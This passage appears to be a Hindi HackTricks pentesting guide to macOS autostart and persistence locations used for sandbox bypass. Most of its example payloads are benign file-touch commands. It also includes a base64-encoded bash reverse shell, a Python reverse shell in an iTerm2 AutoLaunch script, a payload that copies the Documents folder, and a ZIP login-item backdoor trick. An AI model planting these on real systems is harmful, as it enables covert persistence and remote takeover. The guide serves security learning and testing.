# macOS ऑटो स्टार्ट

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके अपना योगदान दें।**

</details>

यह खंड मुख्य रूप से [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) ब्लॉग श्रृंखला पर आधारित है, उद्देश्य है **अधिक Autostart स्थानों** (यदि संभव हो) को जोड़ना, नवीनतम macOS (13.4) के साथ **कौन से तकनीक काम कर रही हैं** और अनुमतियों को निर्दिष्ट करना।

## सैंडबॉक्स बाईपास

{% hint style="success" %}
यहां आपको सैंडबॉक्स बाईपास के लिए उपयोगी स्टार्ट स्थान मिलेंगे जो आपको केवल कुछ को **एक फ़ाइल में लिखकर** और एक बहुत **सामान्य क्रिया**, निर्धारित **समय की मात्रा** या एक **क्रिया** के लिए **इंतजार करने** की अनुमति देता है, जिसे आप सामान्यतः रूट अनुमतियों की आवश्यकता नहीं होती है।
{% endhint %}

### Launchd

* सैंडबॉक्स बाईपास के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* **`/Library/LaunchAgents`**
* **ट्रिगर**: पुनर्आरंभ
* रूट अनुमति आवश्यक
* **`/Library/LaunchDaemons`**
* **ट्रिगर**: पुनर्आरंभ
* रूट अनुमति आवश्यक
* **`/System/Library/LaunchAgents`**
* **ट्रिगर**: पुनर्आरंभ
* रूट अनुमति आवश्यक
* **`/System/Library/LaunchDaemons`**
* **ट्रिगर**: पुनर्आरंभ
* रूट अनुमति आवश्यक
* **`~/Library/LaunchAgents`**
* **ट्रिगर**: पुनर्लॉग-इन
* **`~/Library/LaunchDemons`**
* **ट्रिगर**: पुनर्लॉग-इन

#### विवरण और शोषण

**`launchd`** ओएस एक्स कर्नल द्वारा स्टार्टअप पर सबसे पहला प्रक्रिया है और बंद होने पर अंतिम होता है। इसे हमेशा **PID 1** होना चाहिए। यह प्रक्रिया **ASEP** **plists** में निर्दिष्ट विन्यासों को पढ़ेगी और निष्पादित करेगी:

* `/Library/LaunchAgents`: प्रशासक द्वारा स्थापित प्रति-उपयोगकर्ता एजेंट
* `/Library/LaunchDaemons`: प्रशासक द्वारा स्थापित सिस्टम-व्यापी डेमन
* `/System/Library/LaunchAgents`: Apple द्वारा प्रदान किए गए प्रति-उपयोगकर्ता एजेंट
* `/System/Library/LaunchDaemons`: Apple द्वारा प्रदान किए गए सिस्टम-व्यापी डेमन

जब एक उपयोगकर्ता लॉग इन करता है, `/Users/$USER/Library/LaunchAgents` और `/Users/$USER/Library/LaunchDemons` में स्थित plists **लॉग इन करने वाले उपयोगकर्ता की अनुमतियों** के साथ शुरू हो जाते हैं।

**एजेंट और डेमन के मुख्य अंतर है कि एजेंट उपयोगकर्ता लॉग इन करते ही लोड होते हैं और डेमन सिस्टम स्टार्टअप पर लोड होते हैं** (क्योंकि ssh जैसी सेवाएं हैं जो किसी भी उपयोगकर्ता को सिस्टम तक पहुंचने से पहले निष्पादित होने की आवश्यकता होती है)। इसके अलावा, एजेंट GUI का उपयोग कर सकते हैं जबकि डेमन को पिछले प्लेन में चलाने की आवश्यकता होती है।
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
ऐसे मामलों में होता है जहां **उपयोगकर्ता लॉगिन करने से पहले एक एजेंट को निष्पादित किया जाना चाहिए**, इन्हें **प्रीलॉगिन एजेंट्स** कहा जाता है। उदाहरण के लिए, यह लॉगिन पर सहायक प्रौद्योगिकी प्रदान करने के लिए उपयोगी होता है। इन्हें भी `/Library/LaunchAgents` में पाया जा सकता है (यहां [**यहां**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) एक उदाहरण देखें)।

{% hint style="info" %}
नए डेमन या एजेंट कॉन्फ़िग फ़ाइलें **अगले बूट या** `launchctl load <target.plist>` का उपयोग करके लोड होंगी। इसके साथ ही `launchctl -F <file>` का उपयोग करके .plist फ़ाइलें बिना वह एक्सटेंशन के भी लोड की जा सकती हैं (हालांकि वे plist फ़ाइलें बूट के बाद स्वचालित रूप से लोड नहीं होंगी)।\
`launchctl unload <target.plist>` का उपयोग करके अनलोड भी किया जा सकता है (इसके द्वारा इसे संकेतित प्रक्रिया समाप्त हो जाएगी)।

यह सुनिश्चित करने के लिए कि कोई **एजेंट** या **डेमन** **को** **चलाने से** **रोकने वाली** कोई **चीज़** (जैसे ओवरराइड) **नहीं है**, निम्नलिखित को चलाएं: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

वर्तमान उपयोगकर्ता द्वारा लोड किए गए सभी एजेंट और डेमनों की सूची:
```bash
launchctl list
```
{% hint style="warning" %}
यदि एक plist एक उपयोगकर्ता के द्वारा स्वामी सिस्टम वाइड फ़ोल्डर में होता है, तो कार्य उपयोगकर्ता के रूप में और न कि रूट के रूप में निष्पादित होगा। इससे कुछ प्रिविलेज उन्नयन हमलों को रोका जा सकता है।
{% endhint %}

### शैल स्टार्टअप फ़ाइलें

लेख: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
लेख (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* सूचीबद्ध स्थान:
  * **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
  * **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
  * **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  * **ट्रिगर**: zsh के साथ एक टर्मिनल खोलें
  * रूट की आवश्यकता होती है
  * **`~/.zlogout`**
  * **ट्रिगर**: zsh के साथ एक टर्मिनल से बाहर निकलें
  * **`/etc/zlogout`**
  * **ट्रिगर**: zsh के साथ एक टर्मिनल से बाहर निकलें
  * रूट की आवश्यकता होती है
  * संभावित और अधिक: **`man zsh`**
  * **`~/.bashrc`**
  * **ट्रिगर**: bash के साथ एक टर्मिनल खोलें
  * `/etc/profile` (काम नहीं किया)
  * `~/.profile` (काम नहीं किया)
  * `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  * **ट्रिगर**: xterm के साथ ट्रिगर होने की उम्मीद है, लेकिन यह **स्थापित नहीं है** और स्थापित करने के बाद भी यह त्रुटि उठाई जाती है: xterm: `DISPLAY is not set`

#### विवरण और शोषण

शैल स्टार्टअप फ़ाइलें हमारे शैल पर्यावरण को शुरू करने के समय निष्पादित होती हैं, जैसे `zsh` या `bash`। आजकल macOS डिफ़ॉल्ट रूप से `/bin/zsh` पर जाता है, और **जब हम `Terminal` खोलते हैं या उपकरण में SSH करते हैं**, यही शैल पर्यावरण है जिसमें हम रखे जाते हैं। `bash` और `sh` अभी भी उपलब्ध हैं, हालांकि उन्हें विशेष रूप से शुरू किया जाना चाहिए।

हम **`man zsh`** के साथ पढ़ सकते हैं, जिसमें शैल स्टार्टअप फ़ाइलों का एक लंबा विवरण है।
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### फिर से खोले गए एप्लिकेशन्स

{% hint style="danger" %}
मुझे इस एप्लिकेशन को चलाने के लिए इंजेक्शन को कॉन्फ़िगर करने और लॉगआउट और लॉगइन या रीबूट करने से काम नहीं बना। (एप्लिकेशन चल नहीं रहा था, शायद ये कार्रवाई करते समय यह चल रहा होना चाहिए)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **ट्रिगर**: एप्लिकेशनों को फिर से खोलने पर पुनरारंभ करें

#### विवरण और इंजेक्शन

सभी फिर से खोलने वाले एप्लिकेशन `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` में होते हैं।

तो, अपने एप्लिकेशन को खोलने के लिए फिर से खोलने वाले एप्लिकेशनों में अपना एप्लिकेशन **सूची में जोड़ना** होगा।

UUID उस निर्देशिका को सूचीबद्ध करके या `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` के साथ पाया जा सकता है।

फिर से खोले जाने वाले एप्लिकेशनों की जांच करने के लिए आप कर सकते हैं:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
इस सूची में एक एप्लिकेशन जोड़ने के लिए आप निम्नलिखित का उपयोग कर सकते हैं:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### टर्मिनल प्राथमिकताएं

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **ट्रिगर**: टर्मिनल खोलें

#### विवरण और उत्पीड़न

**`~/Library/Preferences`** में एप्लिकेशन में उपयोगकर्ता की प्राथमिकताएं संग्रहित होती हैं। इनमें से कुछ प्राथमिकताएं अन्य एप्लिकेशन/स्क्रिप्ट को **चलाने के लिए एक कॉन्फ़िगरेशन** रख सकती हैं।

उदाहरण के लिए, टर्मिनल स्टार्टअप में एक कमांड चला सकती है:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

यह कॉन्फ़िगरेशन फ़ाइल **`~/Library/Preferences/com.apple.Terminal.plist`** में इस प्रकार दिखाई देती है:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
तो, अगर सिस्टम में टर्मिनल की प्राथमिकताओं की प्लिस्ट अधिलेखित की जा सकती है, तो **`open`** कार्यक्षमता का उपयोग करके **टर्मिनल खोली जा सकती है और उस कमांड को निष्पादित किया जाएगा**।

आप इसे कमांड लाइन से जोड़ सकते हैं:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### टर्मिनल स्क्रिप्ट

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* **कहीं भी**
* **ट्रिगर**: टर्मिनल खोलें

#### विवरण और शोषण

यदि आप एक [**`.terminal`** स्क्रिप्ट](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) बनाते हैं और उसे खोलते हैं, तो **टर्मिनल एप्लिकेशन** स्वचालित रूप से आपके द्वारा निर्दिष्ट किए गए कमांड को निष्पादित करने के लिए आह्वानित किया जाएगा। यदि टर्मिनल ऐप को कुछ विशेष अधिकार (जैसे TCC) होते हैं, तो आपका कमांड उन विशेष अधिकारों के साथ चलाया जाएगा।

इसे निम्नलिखित के साथ प्रयास करें:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
{% hint style="danger" %}
यदि टर्मिनल में **पूर्ण डिस्क एक्सेस** है तो वह उस कार्रवाई को पूरा कर सकेगा (ध्यान दें कि टर्मिनल विंडो में निष्पादित कमांड दिखाई देगा)।
{% endhint %}

### ऑडियो प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
लेख: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### स्थान

* **`/Library/Audio/Plug-Ins/HAL`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को रीस्टार्ट करें
* **`/Library/Audio/Plug-ins/Components`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को रीस्टार्ट करें
* **`~/Library/Audio/Plug-ins/Components`**
* **ट्रिगर**: coreaudiod या कंप्यूटर को रीस्टार्ट करें
* **`/System/Library/Components`**
* रूट की आवश्यकता
* **ट्रिगर**: coreaudiod या कंप्यूटर को रीस्टार्ट करें

#### विवरण

पिछले लेखों के अनुसार, कुछ ऑडियो प्लगइन्स को **कंपाइल** किया जा सकता है और उन्हें लोड किया जा सकता है।

### क्विकलुक प्लगइन्स

लेख: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### विवरण और शोषण

क्विकलुक प्लगइन्स को निष्पादित किया जा सकता है जब आप एक फ़ाइल के पूर्वावलोकन को **ट्रिगर करते हैं** (फ़ाइल को फ़ाइंडर में चयनित करके स्पेस बार दबाएं) और एक **फ़ाइल प्रकार का समर्थन करने वाला प्लगइन** स्थापित होता है।

आप अपना खुद का क्विकलुक प्लगइन कंपाइल कर सकते हैं, उसे पिछले स्थानों में रखें और फिर समर्थित फ़ाइल पर जाएं और उसे ट्रिगर करने के लिए स्पेस बार दबाएं।

### ~~लॉगिन/लॉगआउट हुक~~

{% hint style="danger" %}
मेरे साथ यह काम नहीं किया, न तो उपयोगकर्ता लॉगिन हुक और न ही रूट लॉगआउट हुक के साथ।
{% endhint %}

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* आपको कुछ ऐसा निष्पादित करने की क्षमता होनी चाहिए जैसे `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `~/Library/Preferences/com.apple.loginwindow.plist` में स्थित हैं

वे पुराने हो गए हैं लेकिन जब एक उपयोगकर्ता लॉग इन करता है तो कमांड निष्पादित करने के लिए उपयोग किए जा सकते हैं।
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
यह सेटिंग `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` में संग्रहीत होती है।
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
इसे हटाने के लिए:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** में रूट उपयोगकर्ता संग्रहीत होता है।

## शर्ताधीन सैंडबॉक्स बाईपास

{% hint style="success" %}
यहां आपको **सैंडबॉक्स बाईपास** के लिए उपयोगी स्टार्ट स्थान मिलेंगे जो आपको केवल किसी फ़ाइल में लिखकर कुछ को निष्पादित करने और विशेष **प्रोग्राम स्थापित, "असामान्य" उपयोगकर्ता** क्रियाएँ या पर्यावरण की जरूरत जैसी **आम नहीं होने** की उम्मीद रखती है।
{% endhint %}

### क्रॉन

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* सैंडबॉक्स बाईपास के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* हालांकि, आपको `crontab` बाइनरी को निष्पादित करने की क्षमता होनी चाहिए
* या फिर रूट होना चाहिए

#### स्थान

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* सीधी लेखन पहुँच के लिए रूट की आवश्यकता होती है। `crontab <file>` को निष्पादित कर सकते हैं तो रूट की आवश्यकता नहीं होती है
* **ट्रिगर**: क्रॉन जॉब पर निर्भर करेगा

#### विवरण और शोषण
```bash
crontab -l
```
आप यूजर्स के सभी क्रॉन जॉब्स को भी देख सकते हैं **`/usr/lib/cron/tabs/`** और **`/var/at/tabs/`** में (रूट अधिकार चाहिए।)

MacOS में कई फ़ोल्डर होते हैं जो **निश्चित अंतराल** के साथ स्क्रिप्ट्स को निष्पादित करते हैं:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
वहां आप नियमित **cron** **जॉब्स**, **at** **जॉब्स** (बहुत कम उपयोग होते हैं) और **पीरियडिक** **जॉब्स** (मुख्य रूप से अस्थायी फ़ाइलों को साफ़ करने के लिए उपयोग किए जाते हैं) मिलेंगे। दैनिक पीरियडिक जॉब्स को उदाहरण के लिए इस तरह से निष्पादित किया जा सकता है: `periodic daily`।

**उपयोगकर्ता क्रॉनजॉब कार्यक्रम को प्रोग्रामेटिक रूप से जोड़ने** के लिए निम्नलिखित का उपयोग किया जा सकता है:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

लेख: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

#### स्थान

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **ट्रिगर**: iTerm खोलें
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **ट्रिगर**: iTerm खोलें
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **ट्रिगर**: iTerm खोलें

#### विवरण और उत्पीड़न

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** में संग्रहीत स्क्रिप्ट निष्पादित होंगे। उदाहरण के लिए:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
या:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
स्क्रिप्ट **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** भी निष्पादित होगा:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
**`~/Library/Preferences/com.googlecode.iterm2.plist`** में स्थित iTerm2 प्राथमिकताएं जब iTerm2 टर्मिनल खोला जाता है, तो **एक कमांड को निष्पादित करने की संकेत कर सकती हैं**।

इस सेटिंग को iTerm2 सेटिंग में कॉन्फ़िगर किया जा सकता है:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

और यह कमांड प्राथमिकताओं में प्रतिबिंबित होता है:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
आप निम्नलिखित कमांड को सेट कर सकते हैं:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
बहुत संभावित है कि iTerm2 प्राथमिकताएं अनियमित आदेश निष्पादित करने के लिए **अन्य तरीके** हो सकते हैं।
{% endhint %}

### xbar

लेख: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन xbar को स्थापित किया जाना चाहिए

#### स्थान

* **`~/Library/Application\ Support/xbar/plugins/`**
* **ट्रिगर**: xbar को एक्सीक्यूट किया जाता है

### Hammerspoon

**लेख**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

सैंडबॉक्स को छलना करने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)

* लेकिन Hammerspoon को स्थापित किया जाना चाहिए

#### स्थान

* **`~/.hammerspoon/init.lua`**
* **ट्रिगर**: hammerspoon को एक्सीक्यूट किया जाता है

#### विवरण

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) एक स्वचालन उपकरण है, जो **LUA स्क्रिप्टिंग भाषा के माध्यम से macOS स्क्रिप्टिंग** की अनुमति देता है। हम पूरे AppleScript कोड को भी सम्मिलित कर सकते हैं और शेल स्क्रिप्ट चला सकते हैं।

ऐप एक ही फ़ाइल, `~/.hammerspoon/init.lua`, की तलाश करता है, और जब शुरू होता है, स्क्रिप्ट को निष्पादित किया जाएगा।
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

लेख: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन ssh को सक्षम करना और उपयोग करना चाहिए

#### स्थान

* **`~/.ssh/rc`**
* **ट्रिगर**: ssh के माध्यम से लॉगिन
* **`/etc/ssh/sshrc`**
* रूट की आवश्यकता
* **ट्रिगर**: ssh के माध्यम से लॉगिन

#### विवरण और शोषण

डिफ़ॉल्ट रूप से, जब एक उपयोगकर्ता **SSH के माध्यम से लॉगिन करता है**, स्क्रिप्ट **`/etc/ssh/sshrc`** और **`~/.ssh/rc`** क्रियान्वित हो जाएंगे, जब तक `/etc/ssh/sshd_config` में `PermitUserRC no` न हो।

#### विवरण

यदि लोकप्रिय कार्यक्रम [**xbar**](https://github.com/matryer/xbar) स्थापित है, तो यह संभव है कि एक शैल स्क्रिप्ट लिखा जा सकता है **`~/Library/Application\ Support/xbar/plugins/`** में जो xbar की शुरुआत होते ही क्रियान्वित होगा:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **लॉगिन आइटम्स**

लेख: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* सैंडबॉक्स को छलने के लिए उपयोगी: [✅](https://emojipedia.org/check-mark-button)
* लेकिन आपको तार्किक विधि से `osascript` को निष्पादित करने की आवश्यकता होती है

#### स्थान

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **ट्रिगर:** लॉगिन
* एक्सप्लॉइट पेलोड संग्रहीत करने के लिए **`osascript`** को निष्पादित किया जाता है
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **ट्रिगर:** लॉगिन
* रूट अनिवार्य

#### विवरण

सिस्टम प्राथमिकताएं -> उपयोगकर्ता और समूह -> **लॉगिन आइटम्स** में आप **उपयोगकर्ता लॉग इन करते समय निष्पादित होने वाले आइटम** ढूंढ सकते हैं।\
इन्हें सूचीबद्ध करना, जोड़ना और हटाना संभव है कमांड लाइन से:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
ये आइटम फ़ाइल में संग्रहीत होते हैं **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**लॉगिन आइटम** भी इस्तेमाल करके दिखाए जा सकते हैं API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) जो कॉन्फ़िगरेशन को संग्रहीत करेगा **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** में

### लॉगिन आइटम के रूप में ZIP

(लॉगिन आइटम के बारे में पिछले खंड की जांच करें, यह एक विस्तार है)

यदि आप एक **ZIP** फ़ाइल को एक **लॉगिन आइटम** के रूप में संग्रहीत करते हैं तो **`Archive Utility`** इसे खोलेगा और यदि ज़िप उदाहरण के लिए **`~/Library`** में संग्रहीत होता है और यह फ़ोल्डर **`LaunchAgents/file.plist`** बैकडोर के साथ होता है, तो वह फ़ोल्डर बनाया जाएगा (यह डिफ़ॉल्ट रूप से नहीं होता है) और प्लिस्ट जोड़ा जाएगा ताकि अगली बार जब उपयोगकर्ता फिर से लॉग इन करेगा, **प्लिस्ट में दिखाए गए बैकडोर को निष्पादित किया जाएगा**।

एक और विकल्प हो सकता है उपयोगकर्ता होम में फ़ाइलें **`.bash_profile`** और **`.zshenv`** बनाना, इसलिए यदि फ़ोल्डर LaunchAgents पहले से मौजूद है तो यह तकनीक फिर भी काम करेगी।

### At

लेख: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### स्थान

